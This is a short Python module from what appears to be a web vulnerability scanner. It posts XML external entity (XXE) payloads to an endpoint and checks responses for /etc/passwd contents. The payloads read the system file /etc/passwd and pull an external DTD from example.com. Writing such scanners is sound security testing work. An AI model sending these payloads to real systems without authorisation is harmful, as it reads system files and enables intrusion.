# scanner/xxe.py
import requests
import re

# Simple XXE payloads for file read. Use only in lab environments.
XXE_PAYLOADS = [
    """<?xml version="1.0"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>&xxe;</root>""",

    """<?xml version="1.0"?>
    <!DOCTYPE data [
      <!ENTITY % dtd SYSTEM "http://example.com/nonexistent.dtd">
      %dtd;
    ]>
    <data></data>"""
]

XXE_INDICATOR = re.compile(r"root:.*:0:0:|/bin/bash|/etc/passwd", re.IGNORECASE)

def test_xxe_on_endpoint(url, session=None, timeout=8):
    """
    If an endpoint accepts XML (heuristic: content-type or url path), post XXE payloads.
    Returns finding dict on match.
    """
    s = session or requests.Session()
    headers = {"Content-Type": "application/xml", "User-Agent": "TheWescan/0.1"}
    try:
        for payload in XXE_PAYLOADS:
            r = s.post(url, data=payload.encode("utf-8"), headers=headers, timeout=timeout)
            if r is None:
                continue
            if XXE_INDICATOR.search(r.text):
                return {"payload": payload, "evidence": r.text[:1000]}
    except Exception:
        return None
    return None
